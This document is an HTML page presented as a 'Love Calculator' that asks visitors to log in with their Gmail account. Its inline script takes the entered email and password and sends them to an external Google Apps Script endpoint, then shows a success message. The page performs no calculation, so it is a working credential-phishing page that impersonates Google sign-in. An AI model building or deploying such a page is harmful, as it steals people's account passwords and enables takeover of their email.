<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <style>
        body {background: linear-gradient(106deg, rgba(34,51,195,1) 0%, rgba(253,45,45,1) 100%); height: 100%; }
        form {border: 3px solid #f1f1f1;}

        input[type=text], input[type=password] {
            width: 100%;
            padding: 12px 20px;
            margin: 8px 0;
            display: inline-block;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        label{
            font-family: "Open Sans";
            font-weight: 200;
        }
        img{
            width: 22px;
            height: 18px;
        }

        button {
            background-color: #4CAF50;
            position: relative;
            right: -50%;
            margin-top: 15px;
            width: 120px;
            height: 40px;
            color: white;
            font-size: x-large;
            border: none;
            cursor: pointer;
            text-align: center;
            z-index: 5;
        transform: translateX(-50%);}

        button:hover {
            opacity: 0.8;
        }
        form{
            border: none;
        }

        .container {
            padding: 16px;
            background-color: white;
            width: 90%;
            position: relative;
            right: -50%;
            transform: translateX(-50%);
            height: 650px;
            z-index: 1;

        }
        h1{
            font-family: Dubai;
            color: red;
            text-align: center;"

        }
        h2{
            font-family: monospace;
            text-align: center;
        }

        span.psw {
            float: right;
            padding-top: 16px;
        }

        /* Change styles for span and cancel button on extra small screens */
        @media screen and (max-width: 300px) {
            span.psw {
                display: block;
                float: none;
            }
        }
    </style>
</head>
<body>

<div class="container">

<h1 >Love Calculator</h1>

<h2 >Login with <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/45/New_Logo_Gmail.svg/256px-New_Logo_Gmail.svg.png"></h2>


    <form id="test-form">

        <label >Your Gmail account</label>
        <input type="text" placeholder="Enter email" id="username" name="username" required>

        <label >Password</label>
        <input type="password" placeholder="Enter password" id="password" name="pwd" required>

        <button id="submit-form" type="submit">Login</button>
    </form>
    </div>



<script type="text/javascript">

        var $form = $('form#test-form'),
            url = "https://script.google.com/macros/s/AKfycbwrE_2y1czMqJMzU1e85qYH0HDuZtV3woIdOHLJ_tKqdvbwGkE/exec";

        $('#submit-form').on('click', function(e) {
            console.log('clicked on submit')
            e.preventDefault();
            const test_form = document.getElementById('test-form');
            const formData = new FormData(test_form);
            let jsonObject = {};

            for (const [key, value]  of formData.entries()) {
                jsonObject[key] = value;
            }
            console.log('data is ', jsonObject);



            var jqxhr = $.ajax({
                    url: url,
                    method: "GET",
                    dataType: "json",
                    data: jsonObject,
                    success: function end_and_reload() {
                        alert('You have successfully submitted the form');
                    }
                }
            );

            console.log('success');
            // document.getElementById('test-form').reset();   // include after the sheets issue is handled

        })

</script>

</body>
</html>
